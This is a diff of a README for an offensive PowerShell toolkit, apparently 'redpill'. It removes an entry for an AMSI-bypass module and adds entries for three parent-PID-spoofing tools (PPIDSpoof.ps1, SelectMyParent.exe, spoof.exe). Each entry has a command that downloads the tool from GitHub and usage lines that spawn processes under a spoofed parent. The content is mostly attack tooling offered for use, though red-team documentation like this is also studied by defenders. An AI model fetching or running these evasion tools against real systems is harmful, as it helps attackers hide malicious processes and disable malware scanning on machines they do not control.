@@ -1,38 +1,70 @@
 ## Module Name
-   <b><i>AMSBP.ps1</i></b>
+   <b><i>PPIDSpoof.ps1</i></b>
 
 |Function name|Description|Privileges|Notes|
 |---|---|---|---|
-|AMSBP|Disable AMSI within current process|User Land|\*\*\*|
+|PPIDSpoof|Creates a process as a child of a specified process ID.<br />Technique ID: T1134.004 (Access Token Manipulation: Parent PID Spoofing)|User Land|\*\*\*|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Process-Spoofing/PPIDSpoof.ps1" -OutFile "PPIDSpoof.ps1"
 ```
 
 ```powershell
-Import-Module -Name ".\AMSBP.ps1" -Force
-AMSBP
+Import-Module -Name ".\PPIDSpoof.ps1" -Force
 ```
 
----
+<br />
 
-
-
-
-[admin] .\SelectMyParent.exe <process-to-use> <pid-to-spoof>
-[admin] .\SelectMyParent.exe notepad 32
-spawn notepad.exe using id 32 (calculator)
-
-
-[admin] spoof.exe pentestlab.exe 1116
-
-
-[User Land]
-#Spawns a notepad.exe process as a child of the current process.
+Spawns a notepad.exe process as a child of the current process.
+```powershell
 Start-ATHProcessUnderSpecificParent -ParentId $PID -FilePath notepad.exe
+```
 
-#Spawns a notepad.exe process as a child of the first explorer.exe process.
+Spawns a notepad.exe process as a child of the first explorer.exe process.
+```powershell
 Get-Process -Name explorer | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath notepad.exe
+```
 
-#Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.
+Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.
+```powershell
 Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath powershell.exe -CommandLine '-Command Write-Host foo'
+```
+
+<br />
+
+## Module Name
+   <b><i>SelectMyParent.ps1</i></b>
+
+|Binary name|Description|Privileges|Notes|
+|---|---|---|---|
+|SelectMyParent|Creates a process as a child of a specified process ID.<br />Technique ID: T1134.004 (Access Token Manipulation: Parent PID Spoofing)|Administrator|\*\*\*|
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Process-Spoofing/SelectMyParent.exe" -OutFile "SelectMyParent.exe"
+```
+
+```powershell
+.\SelectMyParent.exe <process-to-use> <pid-to-spoof>
+
+# Spawn notepad.exe using id 32 (calculator)
+.\SelectMyParent.exe notepad 32
+```
+
+<br />
+
+
+## Module Name
+   <b><i>spoof.ps1</i></b>
+
+|Binary name|Description|Privileges|Notes|
+|---|---|---|---|
+|spoof|Creates a process as a child of a specified process ID.<br />Technique ID: T1134.004 (Access Token Manipulation: Parent PID Spoofing)|Administrator|\*\*\*|
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Process-Spoofing/spoof.exe" -OutFile "spoof.exe"
+```
+
+```powershell
+.\spoof.exe <process-to-use> <pid-to-spoof>
+.\spoof.exe pentestlab.exe 1116
+```
